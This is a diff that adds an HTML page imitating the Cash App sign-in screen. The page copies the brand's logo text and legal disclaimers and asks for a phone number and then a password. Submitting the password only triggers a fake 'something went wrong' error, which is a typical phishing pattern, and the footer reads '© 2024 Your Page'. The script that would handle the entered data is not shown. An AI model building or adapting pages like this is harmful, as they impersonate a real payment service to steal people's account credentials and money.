@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cash App Login: Sign in to your account</title>
+    <link rel="stylesheet" type="text/css" href="style.css"> <!-- Correctly linked CSS -->
+    <script src="script.js" defer></script> <!-- Correctly linked JS -->
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <span class="dollar-sign">$</span>
+            <span class="cash-app">Cash App</span>
+        </div>
+    </header>
+    <div class="login-container">
+        <header>
+            <h1 class="title">Log in</h1>
+        </header>
+        <main>
+            <section id="numberSection" class="form-section">
+                <p class="instruction">Enter your phone number. New to Cash App? <a href="#" class="create-account">Create account</a></p>
+                <form id="numberForm" onsubmit="return goToPasswordSection(event)">
+                    <label for="phone" class="phone-label">Mobile number</label>
+                    <div class="input-container">
+                        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" alt="USA flag">
+                        <span>(+1)</span>
+                        <input type="text" id="phone" name="phone" writingsuggestions="false" oninput="enableContinueButton()" required>
+                    </div>
+                    <p class="terms">By entering and clicking Continue, you agree to the <a href="#">Terms</a>, <a href="#">E-Sign Consent</a>, & <a href="#">Privacy Policy</a>.</p>
+                    <div class="form-actions">
+                        <button type="submit" id="continueBtn" disabled>Continue</button>
+                    </div>
+                </form>
+                <p class="disclaimer">Banking services provided by Cash App’s bank partners. Debit cards issued by Sutton Bank. Brokerage services by Cash App Investing LLC, member FINRA, subsidiary of Block, Inc formerly known as Square, Inc. Bitcoin services by Block, Inc. Cash App Investing does not trade bitcoin and Block, Inc. is not a member of FINRA or SIPC. Tax filing services by Cash App Taxes, Inc. <a href="#">Disclosures</a>.</p>
+            </section>
+            <section id="passwordSection" class="form-section" style="display: none;">
+                <h2 class="password-title">Enter your password</h2>
+                <form id="passwordForm" onsubmit="return showError(event)">
+                    <label for="password">Password</label>
+                    <div class="input-container">
+                        <input type="password" id="password" name="password" writingsuggestions="false" required>
+                    </div>
+                    <div class="form-actions">
+                        <button type="submit">Continue</button>
+                    </div>
+                </form>
+            </section>
+            <section id="errorSection" class="form-section" style="display: none;">
+                <h2 class="error-title">Oops, something went wrong.</h2>
+                <p>Please refresh the page and try again.</p>
+            </section>
+        </main>
+        <footer>
+            <p>&copy; 2024 Your Page</p>
+        </footer>
+    </div>
+</body>
+</html>
